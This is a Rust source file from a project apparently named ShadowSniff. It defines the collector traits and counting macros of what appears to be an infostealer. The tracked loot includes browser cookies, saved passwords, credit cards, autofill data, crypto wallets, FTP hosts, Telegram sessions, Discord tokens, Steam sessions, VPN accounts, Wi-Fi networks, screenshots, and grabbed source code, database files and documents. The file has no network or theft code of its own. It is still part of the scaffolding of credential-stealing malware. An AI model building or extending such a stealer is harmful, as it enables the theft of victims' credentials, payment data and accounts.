/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![no_std]

extern crate alloc;

use alloc::format;
use alloc::vec::Vec;
pub mod atomic;
pub mod display;

macro_rules! increase_count {
    ($name:ident) => {
        paste::paste! {
            fn [<increase_ $name _by>](&self, count: usize);

            fn [<increase_ $name>](&self) {
                self.[<increase_ $name _by>](1);
            }

            fn [<get_ $name>](&self) -> usize;
        }
    };
}

macro_rules! flag {
    ($name:ident) => {
        paste::paste! {
            fn [<set_ $name>](&self);

            fn [<is_ $name>](&self) -> bool;
        }
    };

    ($name:ident, $ty:ty) => {
        paste::paste! {
            fn [<set_ $name>](&self, val: $ty);

            fn [<get_ $name>](&self) -> Option<$ty>;
        }
    };
}

pub trait Browser: Send + Sync {
    increase_count!(cookies);
    increase_count!(passwords);
    increase_count!(credit_cards);
    increase_count!(auto_fills);
    increase_count!(history);
    increase_count!(bookmarks);
    increase_count!(downloads);
}

pub trait Software: Send + Sync {
    increase_count!(wallets);
    increase_count!(ftp_hosts);
    flag!(telegram);
    increase_count!(discord_tokens);
    increase_count!(steam_session);
}

pub trait FileGrabber: Send + Sync {
    increase_count!(source_code_files);
    increase_count!(database_files);
    increase_count!(documents);
}

pub trait Vpn: Send + Sync {
    increase_count!(accounts);
}

pub trait Device: Send + Sync {
    increase_count!(wifi_networks);
    flag!(screenshot, Vec<u8>);
}

pub trait Collector: Send + Sync {
    type Browser: Browser;
    type Software: Software;
    type FileGrabber: FileGrabber;
    type Vpn: Vpn;
    type Device: Device;

    fn get_browser(&self) -> &Self::Browser;

    fn get_software(&self) -> &Self::Software;

    fn get_file_grabber(&self) -> &Self::FileGrabber;

    fn get_vpn(&self) -> &Self::Vpn;

    fn get_device(&self) -> &Self::Device;
}
